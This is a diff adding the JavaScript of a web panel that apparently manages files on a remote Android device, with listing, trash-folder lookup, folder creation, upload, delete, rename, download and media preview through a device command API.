+                '/storage/emulated/0/.Trashed',
+                '/storage/emulated/0/Android/.Trash',
+                '/storage/emulated/0/DCIM/.thumbnails/.trash'
+            ];
+
+            try {
+                let found = false;
+                for (const tp of trashPaths) {
+                    try {
+                        const response = await api.sendCommand(deviceId, 'files_list', { path: tp });
+                        if (response.success && response.data && response.data.files && response.data.files.length > 0) {
+                            loadFiles(tp);
+                            found = true;
+                            break;
+                        }
+                    } catch (e) { }
+                }
+
+                if (!found) {
+                    const container = document.getElementById('file-list');
+                    document.getElementById('file-count').style.display = 'none';
+                    document.getElementById('breadcrumb').innerHTML = '';
+                    // FIX-F2: Was manually setting btn styles here, missing sync with updateToolbarVisibility()
+                    currentPath = '';
+                    updateToolbarVisibility();
+                    container.innerHTML = `
+                        <div class="empty">
+                            <div class="e-icon"><i data-lucide="trash-2" style="width:48px;height:48px;"></i></div>
+                            <h2>Recycle Bin Not Enabled</h2>
+                            <p>This device does not have a trash folder enabled.</p>
+                            <p style="margin-top:8px; font-size:0.65rem;">On Android 11+, some file managers create a .Trash folder. Deleted files may be permanently removed.</p>
+                        </div>`;
+                    lucide.createIcons();
+                }
+            } catch (error) {
+                api.showToast('Failed to check Recycle Bin: ' + error.message, 'error');
+            }
+        });
+
+        document.getElementById('btn-newfolder').addEventListener('click', async () => {
+            const folderName = prompt('Enter folder name:');
+            if (!folderName) return;
+            // Allow Unicode names — only block chars illegal on Linux/Android: / \ : * ? " < > |
+            if (/[\/\\:*?"<>|]/.test(folderName) || folderName.startsWith('.')) { api.showToast('Invalid folder name — cannot contain \ / : * ? " < > |', 'error'); return; }
+
+            try {
+                const response = await api.sendCommand(deviceId, 'file_mkdir', { path: `${currentPath}/${folderName}` });
+                if (response.success && (response.data?.status === 'success' || response.status === 'success')) {
+                    api.showToast('Folder created!', 'success');
+                    loadFiles(currentPath);
+                } else {
+                    throw new Error(response.error || response.data?.error || 'Failed to create folder');
+                }
+            } catch (error) { api.showToast(error.message, 'error'); }
+        });
+
+        document.getElementById('btn-upload').addEventListener('click', () => {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.onchange = async (e) => {
+                const file = e.target.files[0];
+                if (!file) return;
+                if (file.size > 20 * 1024 * 1024) { api.showToast('File too large (max 20MB)', 'error'); return; }
+                try {
+                    api.showToast('Uploading...', 'info');
+                    await api.uploadFile(deviceId, file, `${currentPath}/${file.name}`);
+                    loadFiles(currentPath);
+                } catch (error) {
+                    api.showToast('Upload failed: ' + (error.message || 'Unknown error'), 'error');
+                }
+            };
+            input.click();
+        });
+
+        async function deleteFile(absolutePath) {
+            const filename = absolutePath.split('/').pop();
+            if (!confirm(`Delete ${filename}?`)) return;
+            try {
+                const response = await api.sendCommand(deviceId, 'file_delete', { path: absolutePath });
+                if (response.success && (response.data?.status === 'success' || response.status === 'success')) {
+                    api.showToast('Deleted successfully', 'success');
+                    
+                    // Remove the deleted item from DOM directly (stay in current view)
+                    const items = document.querySelectorAll('.file-item[data-path]');
+                    let removed = false;
+                    items.forEach(item => {
+                        if (item.getAttribute('data-path') === absolutePath) {
+                            item.style.transition = 'opacity 0.3s, transform 0.3s';
+                            item.style.opacity = '0';
+                            item.style.transform = 'translateX(-20px)';
+                            setTimeout(() => item.remove(), 300);
+                            removed = true;
+                        }
+                    });
+                    
+                    // Update file count
+                    if (removed) {
+                        const remaining = document.querySelectorAll('.file-item[data-path]').length - 1;
+                        const countEl = document.getElementById('file-count');
+                        countEl.textContent = (remaining < 0 ? 0 : remaining) + ' items';
+                    } else {
+                        // Fallback: reload current directory if DOM element not found
+                        loadFiles(currentPath);
+                    }
+                } else { throw new Error(response.error || response.data?.error || 'Failed to delete'); }
+            } catch (error) { api.showToast(error.message, 'error'); }
+        }
+
+        async function renameFile(absolutePath) {
+            const oldName = absolutePath.split('/').pop();
+            const parentDir = absolutePath.substring(0, absolutePath.lastIndexOf('/'));
+            const newName = prompt('Enter new name:', oldName);
+            if (!newName || newName === oldName) return;
+            // FIX-F3: Was ^[a-zA-Z0-9_\-\s.]+$ which rejected ALL Unicode filenames (Hindi, Chinese, etc.)
+            // Now only blocks characters that are illegal on Android/Linux filesystems: / \ : * ? " < > |
+            if (/[\/\\:*?"<>|]/.test(newName) || newName.startsWith('.')) { api.showToast('Invalid filename', 'error'); return; }
+            try {
+                const response = await api.sendCommand(deviceId, 'file_rename', {
+                    oldPath: absolutePath,
+                    newPath: `${parentDir}/${newName}`
+                });
+                if (response.success && (response.data?.status === 'success' || response.status === 'success')) {
+                    api.showToast('Renamed successfully', 'success');
+                    loadFiles(currentPath);
+                } else { throw new Error(response.error || response.data?.error || 'Failed to rename'); }
+            } catch (error) { api.showToast(error.message, 'error'); }
+        }
+
+        function downloadFile(absolutePath) {
+            api.downloadFile(deviceId, absolutePath);
+        }
+        // Expose globally so preview modal inline onclick can access it
+        window.downloadFile = downloadFile;
+
+        // ===== MEDIA PREVIEW =====
+        async function previewFile(absolutePath, filename) {
+            const ext = filename.split('.').pop().toLowerCase();
+            const isImage = ['jpg','jpeg','png','gif','bmp','webp','svg'].includes(ext);
+            const isVideo = ['mp4','avi','mkv','mov','wmv','webm','3gp'].includes(ext);
+            const isAudio = ['mp3','wav','flac','aac','ogg','m4a'].includes(ext);
+
+            // Create modal overlay
+            const overlay = document.createElement('div');
+            overlay.id = 'preview-overlay';
+            overlay.style.cssText = 'position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,0.85);backdrop-filter:blur(12px);display:flex;align-items:center;justify-content:center;flex-direction:column;padding:20px;';
+            overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };
+
+            const header = document.createElement('div');
+            header.style.cssText = 'display:flex;align-items:center;justify-content:space-between;width:100%;max-width:800px;margin-bottom:12px;';
+            header.innerHTML = `
+                <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-secondary);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:70%;">${escHtml(filename)}</span>
+                <div style="display:flex;gap:8px;">
+                    <button onclick="downloadFile('${escJs(absolutePath)}')" style="padding:6px 14px;border-radius:6px;border:1px solid rgba(0,255,65,0.2);background:rgba(0,255,65,0.08);color:var(--accent);font-size:0.65rem;cursor:pointer;">⬇ Download</button>
+                    <button onclick="document.getElementById('preview-overlay').remove()" style="padding:6px 14px;border-radius:6px;border:1px solid var(--border);background:var(--bg-card);color:var(--text-secondary);font-size:0.65rem;cursor:pointer;">✕ Close</button>
+                </div>`;
+            overlay.appendChild(header);
+
+            const content = document.createElement('div');
+            content.style.cssText = 'display:flex;align-items:center;justify-content:center;width:100%;max-width:800px;max-height:70vh;background:var(--bg-card);border:1px solid var(--border);border-radius:12px;overflow:hidden;position:relative;';
+            content.innerHTML = '<div class="spinner" style="margin:60px auto;"></div>';
+            overlay.appendChild(content);
+            document.body.appendChild(overlay);
+
+            try {
+                const response = await api.sendCommand(deviceId, 'file_download', { path: absolutePath });
+                if (!response.success || !response.data) {
+                    throw new Error(response.error || 'Failed to load preview');
+                }
+
+                const mimeMap = { jpg:'image/jpeg',jpeg:'image/jpeg',png:'image/png',gif:'image/gif',bmp:'image/bmp',webp:'image/webp',svg:'image/svg+xml',mp4:'video/mp4',webm:'video/webm',mov:'video/quicktime','3gp':'video/3gpp',mp3:'audio/mpeg',wav:'audio/wav',flac:'audio/flac',aac:'audio/aac',ogg:'audio/ogg',m4a:'audio/mp4' };
+                const mime = mimeMap[ext] || 'application/octet-stream';
+
+                let mediaSrc;
+                if (response.data.strategy === 'temp_url' && response.data.tempFilename) {
+                    // Large file — stream via temp download endpoint
+                    mediaSrc = `${api.baseURL}/api/download-temp/${response.data.tempFilename}`;
+                } else if (response.data.data) {
+                    // Small file — inline base64
+                    mediaSrc = `data:${mime};base64,${response.data.data}`;
+                } else {
+                    throw new Error('File too large to preview inline. Use Download instead.');
+                }
+
+                if (isImage) {
+                    content.innerHTML = `<img src="${mediaSrc}" style="max-width:100%;max-height:70vh;object-fit:contain;" />`;
+                } else if (isVideo) {
+                    content.innerHTML = `<video controls autoplay style="max-width:100%;max-height:70vh;"><source src="${mediaSrc}" type="${mime}"></video>`;
+                } else if (isAudio) {
+                    content.style.padding = '40px';
+                    content.innerHTML = `<div style="text-align:center;width:100%;"><div style="font-size:3rem;margin-bottom:16px;">🎵</div><p style="font-family:var(--font-display);font-size:0.8rem;color:var(--text-secondary);margin-bottom:16px;">${escHtml(filename)}</p><audio controls autoplay style="width:100%;max-width:400px;"><source src="${mediaSrc}" type="${mime}"></audio></div>`;
+                }
+            } catch (error) {
+                content.innerHTML = `<div style="text-align:center;padding:40px;"><p style="font-family:var(--font-display);font-size:0.8rem;color:var(--danger);">⚠ Preview Failed</p><p style="font-family:var(--font-mono);font-size:0.65rem;color:var(--text-muted);margin-top:8px;">${escHtml(error.message)}</p><p style="font-family:var(--font-display);font-size:0.6rem;color:var(--text-muted);margin-top:12px;">Files larger than 5MB cannot be previewed inline. Use Download instead.</p></div>`;
+            }
+        }
+    </script>
+</body>
+
+</html>
